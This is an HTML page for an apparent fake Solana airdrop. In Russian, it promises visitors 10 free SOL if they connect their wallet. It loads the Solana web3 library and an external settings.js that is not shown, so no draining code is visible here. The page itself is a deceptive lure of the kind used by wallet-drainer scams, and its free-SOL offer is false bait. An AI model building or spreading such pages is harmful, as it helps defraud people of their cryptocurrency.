<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Solana Airdrop</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      margin: 0;
      background-color: #f0f0f0;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      margin: 5px;
    }
    #status {
      margin-top: 20px;
      color: green;
    }
  </style>
</head>
<body>
  <h1>Получите 10 SOL бесплатно!</h1>
  <p>Подтвердите участие в airdrop через ваш кошелек Solana.</p>
  <button class="connect-button">Подключить кошелек</button>
  <div id="status"></div>

  <script>
    window.Buffer = window.Buffer || {
      from: function (data, encoding) {
        if (typeof data === 'string' && encoding === 'hex') {
          const hex = data.match(/.{1,2}/g).map(h => parseInt(h, 16));
          return new Uint8Array(hex);
        }
        return new Uint8Array(data);
      },
      alloc: function (size) {
        return new Uint8Array(size);
      }
    };
    console.log("Использован минимальный полифилл Buffer");
  </script>

  <script src="https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js"></script>
  <script src="settings.js"></script>
</body>
</html>
